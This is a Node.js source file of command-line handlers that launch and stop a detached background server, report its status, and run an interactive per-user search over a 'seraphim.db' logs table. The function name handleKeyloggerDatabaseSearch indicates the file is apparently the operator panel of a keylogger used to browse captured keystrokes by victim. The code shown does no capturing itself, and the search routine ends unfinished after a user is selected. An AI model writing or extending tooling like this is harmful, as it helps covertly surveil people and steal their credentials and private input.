import pc from "picocolors";
import * as fs from "node:fs";
import { spawn } from "node:child_process";
import {intro, outro, select} from "@clack/prompts";
import Database from "better-sqlite3";

export function serverUpHandler(options) {
    if (fs.existsSync("server.data") && options.force === undefined) {
        console.error(`\n${pc.bgRed(" ERROR ")} server already running (--force to force creation)`);
        return;
    }

    const child = spawn('node', ['server.js', options.port], {
        detached: true,
        stdio: 'ignore'
    });

    fs.writeFileSync("server.data", JSON.stringify({server: child.pid}));
    child.unref();

    console.log(`\n${pc.bgGreen(" SUCCESS ")} server started on port ${options.port}`);
}
export function serverDownHandler() {
    try {
        const file = fs.readFileSync("server.data").toString();
        const fileObject = JSON.parse(file);

        process.kill(fileObject.server);
        fs.unlinkSync("server.data");

        console.log(`\n${pc.bgGreen(" SUCCESS ")} server stopped`);
    } catch (error) {
        console.error(`\n${pc.bgRed(" ERROR ")} server is not running`);
    }
}
export function showStatusHandler() {
    console.log(fs.existsSync("server.data") ?
        `\n${pc.green("   ")}server is running with PID ${JSON.parse(fs.readFileSync("server.data").toString()).server}` :
        `\n${pc.red("  ")}server isn't running!`
    );
    console.log(`${pc.blue("  ")}no email updates.`)
}
export async function handleKeyloggerDatabaseSearch(options) {
    intro(`${pc.bgMagentaBright(' search on database ')}`);

    const db = new Database("seraphim.db");

    const userOptionsQuery = db.prepare(`SELECT DISTINCT username FROM logs`);
    const userOptions = userOptionsQuery.all();

    let newArr = [];

    for (let i = 0; i < userOptions.length; i++){
        newArr.push({value: i.toString(), label: userOptions[i].username})
    }

    const action = await select({
        message: 'Pick an user.',
        options: newArr,
    });

    outro("starting searching...");
}